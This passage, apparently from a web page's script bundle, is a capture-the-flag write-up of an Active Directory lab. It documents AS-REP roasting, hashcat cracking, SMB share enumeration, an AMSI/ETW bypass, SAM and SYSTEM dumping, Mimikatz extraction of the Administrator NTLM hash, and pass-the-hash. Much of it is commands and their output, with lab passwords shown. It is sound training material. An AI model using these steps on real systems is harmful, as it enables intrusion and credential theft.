1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger set to 90c<br><br>Host memory required for this attack: 0 MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt.gz<br>* Passwords.: 14344385<br>* Bytes.....: 53357329<br>* Keyspace..: 14344385<br><br>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8ac208a2af70d6a2bac58fa5cc64103c$89c4fbc54e61730ea6f6769e9dbf8171b980423f815196d77d879a91400ef773d<br>904894d3b9611e42c47e6ab7a5a087628248c14696c1d9431f32d7f75ca54e6be714934653583e1baee45089451f7b2bb95ccfd01e83cddb1d2b6149229b6e2d414116b1a<br>132bcb621399a4894745cbb0f2a59102da0b6d7152c3cf6345d270aef22dd7a8687d2a241db586a33330b58808857db25b14c4edbff2d6397905e63f9585534499779ea54<br>52c790ee9aff1598ea5d41f6360493ad8e801aab5ccb3eca4bbddae15d3a079d5cc949ab4b67bb968bb2cd7a4f892cd5b4d36268dc0f6cec6fba8eafb0f02db93000d1864<br>135c9a4ee7df501f:<code>tj072889*</code><br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)<br>Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8ac208a2af70...df501f<br>Time.Started.....: Tue Oct 28 08:00:55 2025 (2 secs)<br>Time.Estimated...: Tue Oct 28 08:00:57 2025 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:  1307.8 kH/s (0.53ms) @ Accel:256 Loops:1 Thr:1 Vec:8<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 3178496/14344385 (22.16%)<br>Rejected.........: 0/3178496 (0.00%)<br>Restore.Point....: 3177472/14344385 (22.15%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: tjamaalb -> tj030499<br>Hardware.Mon.#1..: Util: 63%<br><br>Started: Tue Oct 28 08:00:51 2025<br>Stopped: Tue Oct 28 08:00:59 2025</pre></p>","<p>Alternatively, it is also possible to use the following variation of the same command to extract and share the hash in a file formatted for hashcat.</p>","<p><pre>$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile ./users -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.208.134 \'vulnnet-rst.local/\'<br>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[-] User a-whitehat doesn\'t have UF_DONT_REQUIRE_PREAUTH set<br>[-] User j-goldenhand doesn\'t have UF_DONT_REQUIRE_PREAUTH set<br>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:92fc9dbb95a6c7146027c7de371b7f61$ecad3cc8207ad3a434a66a6890525679bca9370d938d3aacd5a640e28f9a3a9ca<br>c7d756ea8a5c5f3f7a26149b92c94078278de24c0cf516d822e577852bd03169aa88e87bcdd640f48e7b831984c47a5e68cf62014efacf734388a2532bb312ee493097cc5<br>055318f7422e278a8d3322d89aaeedb113ad07270d63de6e2d965b486975c300b67d6ed0bc2a260d49caddaaf3f3bb419161992a1d3c3ae92123fe26dee682c98266f4e86<br>04a524ab40d81cf01c7e332aee6c4a65a509362e25a3b8875bee5a743e95cbc9649fa8833bf35a2e0c621c5673c2f3c61924ca3136cd4753460c0e940d381c89f36a86ac1<br>02ccae8c5778113a<br>[-] User j-leet doesn\'t have UF_DONT_REQUIRE_PREAUTH set</pre></p>","<p>At this point, I have valid credentials for a user. I can now re-start my whole enumeration process same steps that have been done so far.</p>"]},{"id":"Authenticated SMB Enumeration","title":"<h1> <span style=\\"color:#da1953\\">Aut</span>henticated SMB Enumeration</h1>","body":["<p>Connecting to SMB again, but this time with a user credential may give access to more shares.</p>","<p><pre>$ netexec smb 10.10.208.134 -u \'t-skid\' -p \'tj072889*\' --shares      <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\\t-skid:tj072889* <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  [*] Enumerated shares<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  -----           -----------     ------<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  C$                              Default share<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share <br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing<br>SMB         10.10.208.134   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing</pre></p>","<p>Now I have additional access to the following shares: <b>IPC$</b>, <b>NETLOGON</b> and <b>SYSVOL</b>.</p>",{"id":"Accessing Shares as T-Skid","title":"<h2>Accessing Shares as T-Skid</h2>","body":["<p><pre>$ smbclient \'\\\\\\\\10.10.232.121\\\\IPC$\' -U vulnnet-rst/t-skid<br>Password for [VULNNET-RST\\\\t-skid]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\> ls<br>NT_STATUS_NO_SUCH_FILE listing \\\\*</pre></p>","<p>The <b>IPC$</b> share needs elevated privilege to list the file. Can’t access it with this user\'s credentials; other users may have permission to list the files.</p>","<p><pre>$ smbclient \'\\\\\\\\10.10.232.121\\\\NETLOGON\' -U vulnnet-rst/t-skid<br>Password for [VULNNET-RST\\\\t-skid]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\> ls<br>  .                                   D        0  Tue Mar 16 19:15:49 2021<br>  ..                                  D        0  Tue Mar 16 19:15:49 2021<br>  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021<br><br>                8771839 blocks of size 4096. 4537990 blocks available<br>smb: \\\\> get ResetPassword.vbs <br>getting file \\\\ResetPassword.vbs of size 2821 as ResetPassword.vbs (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)</pre></p>","<p>The <b>NETLOGON</b> share exposes a VisualBasic script, which I can download and inspect. I can clearly see a credential of another user that I previously enumerated.</p>","<p><img src=\\"/cyber/writeup/vulnet-roasted/vbscript.JPG\\" alt=\\"\\"></p>","<p></p>"]},{"id":"Accessing Shares as A-Whitehat","title":"<h2>Accessing Shares as A-Whitehat</h2>","body":["<p><pre>netexec smb 10.10.232.121 -u \'a-whitehat\' -p \'bNdKVkjv3RR9ht\' --shares<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\\\\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  [*] Enumerated shares<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  -----           -----------     ------<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  ADMIN$          READ,WRITE      Remote Admin<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  C$              READ,WRITE      Default share<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  NETLOGON        READ,WRITE      Logon server share <br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  SYSVOL          READ,WRITE      Logon server share <br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing<br>SMB         10.10.232.121   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing</pre></p>","<p>The script says Powned! It means this user is an admin and has all the privileges. It is also confirmed by the READ and WRITE privileges this user has on all the shares. At this point, with a lot of patience, I have enumerated all the shares; it took me like 1h or more. At the end, I found the user flag in <i>\\\\Users\\\\enterprise-core-vn\\\\Desktop\\\\</i></p>","<p><img src=\\"/cyber/writeup/vulnet-roasted/userflag.JPG\\" alt=\\"\\"></p>"]}]},{"id":"Remote access with Evil-WinRM as A-Whitehat","title":"<h1><span style=\\"color:#da1953\\">Rem</span>ote access with Evil-WinRM as A-Whitehat</h1>","body":["<p>With the SMB share, I am limited in operations. Port 5985 is open, which is the WinRM  with Evil-WinRM. It is the equivalent of the SSH service on Linux.</p>","<p><pre>$ evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i 10.10.56.192 -s /usr/share/powershell-empire/empire/server/data/module_source/credentials/<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\' for module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\\\\Users\\\\a-whitehat\\\\Documents> whoami<br>vulnnet-rst\\\\a-whitehat</pre></p>","<p>Note that the command was launched with the flag <b>-s</b>, which indicates the location of my scripts I want to load from my Kali machine, where <i>Invoke-Mimikatz.ps1</i> is located.</p>","<p><img src=\\"/cyber/writeup/vulnet-roasted/adminpriv.JPG\\" alt=\\"\\"></p>"]},{"id":"Extract Admin NTLM","title":"<h1><span style=\\"color:#da1953\\">Ext</span>act SAM file</h1>","body":[{"id":"Bypass antivirus (Bypass-4msi)","title":"<h2>Bypass antivirus (Bypass-4msi)</h2>","body":["<p>To extract the SAM file, first, I need to bypass the antivirus; otherwise, Mimikatz will not work and will be blocked.</p>","<p><pre>*Evil-WinRM* PS C:\\\\Windows\\\\System32\\\\config> Bypass-4MSI<br>                                        <br>Info: Patching 4MSI, please be patient...<br>                                        <br>[+] Success!<br>                                        <br>Info: Patching ETW, please be patient ..<br>                                        <br>[+] Success!</pre></p>"]},{"id":"Copying SAM and SYSTEM","title":"<h2>Copying SAM and SYSTEM</h2>","body":["<p>To extract the SAM file and the Administrator NTLM hash, I can use the SAM file directly from <i>C:/Windows/Syste32/config/SAM</i> because to extract the hash from SAM, I also need the SYSTEM file. While the operating system is in execution, I cannot access the SYSTEM file. To circumvent this problem, I made a local copy of those file and saved in the current user\'s desktop. </p>","<p><pre>*Evil-WinRM* PS C:\\\\Users\\\\a-whitehat\\\\Desktop> reg save HKLM\\\\SYSTEM C:\\\\Users\\\\a-whitehat\\\\Desktop\\\\system.save<br>The operation completed successfully.<br><br>*Evil-WinRM* PS C:\\\\Users\\\\a-whitehat\\\\Desktop> reg save HKLM\\\\SAM C:\\\\Users\\\\a-whitehat\\\\Desktop\\\\sam.save<br>The operation completed successfully.<br><br>*Evil-WinRM* PS C:\\\\Users\\\\a-whitehat\\\\Desktop> ls<br><br><br>    Directory: C:\\\\Users\\\\a-whitehat\\\\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/31/2025   1:58 PM          49152 sam.save<br>-a----       10/31/2025   1:58 PM       16433152 system.save</pre></p>"]},{"id":"Extract Administrator NTLM hash","title":"<h2>Extract Administrator NTLM hash</h2>","body":["<p>To extract the Administrator NTLM hash, I can use my local copy of SAM and SYSTEM. I use the command line argument for Mimikatz and provide the local paths.</p>","<p><pre>*Evil-WinRM* PS C:\\\\Users\\\\a-whitehat\\\\Desktop> Invoke-Mimikatz -Command \'\\"lsadump::sam /system:C:\\\\Users\\\\a-whitehat\\\\Desktop\\\\system.save /SAM:C:\\\\Users\\\\a-whitehat\\\\Desktop\\\\sam.save\\"\'<br>Hostname: WIN-2BO8M1OE1M1.vulnnet-rst.local / S-1-5-21-1589833671-435344116-4136949213<br><br>  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10<br> .## ^ ##.  \\"A La Vie, A L\'Amour\\" - (oe.eo)<br> ## / \\\\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br> ## \\\\ / ##       > https://blog.gentilkiwi.com/mimikatz<br> \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  \'#####\'        > https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz(powershell) # lsadump::sam /system:C:\\\\Users\\\\a-whitehat\\\\Desktop\\\\system.save /SAM:C:\\\\Users\\\\a-whitehat\\\\Desktop\\\\sam.save<br>Domain : WIN-2BO8M1OE1M1<br>SysKey : f10a2788aef5f622149a41b2c745f49a<br>Local SID : S-1-5-21-3922353661-2074872711-32542901<br><br>SAMKey : 790ed1753a942488d45b96159e2cd967<br><br>RID  : 000001f4 (500)<br>User : Administrator<br>  Hash NTLM: c2597747aa5e43022a3a3049a3c3b09d<br><br>RID  : 000001f5 (501)<br>User : Guest<br><br>RID  : 000001f7 (503)<br>User : DefaultAccount<br><br>RID  : 000001f8 (504)<br>User : WDAGUtilityAccount</pre></p>","<p>Carefully note how the command line arguments are separated by a single space and the three commands are enclosed in double quotes, and again, the whole string is enclosed in single quotes. It took me several hours to understand the right way to provide the command line argument to Mimikatz.</p>","<p><img src=\\"/cyber/writeup/vulnet-roasted/mimikatz-commnad-line-argument.jpg\\" alt=\\"\\"></p>"]}]},{"id":"Accessing as Administrato","title":"<h1> <span style=\\"color:#da1953\\">Acc</span>essing as Administrator</h1>","body":["<p>After an hour trying to crack the administrator password, I relied on the writeup again and found out that with Evil-WinRm, I can access with the hash and do not necessarily need to crack the hash to get the password in clear text.</p>","<p><img src=\\"/cyber/writeup/vulnet-roasted/admin-access.JPG\\" alt=\\"\\"></p>"]},{"id":"Helpfull links","title":"<h1><span style=\\"color:#da1953\\">Hel</span>pful links</h1>","body":["[1] https://redcanary.com/threat-detection-report/threats/mimikatz/","[2] https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4","[3] https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/","[4] https://www.nitttrchd.ac.in/imee/Labmanuals/Password%20Cracking%20of%20Windows%20Operating%20System.pdf","[5] https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required"]}]}]}')}}]);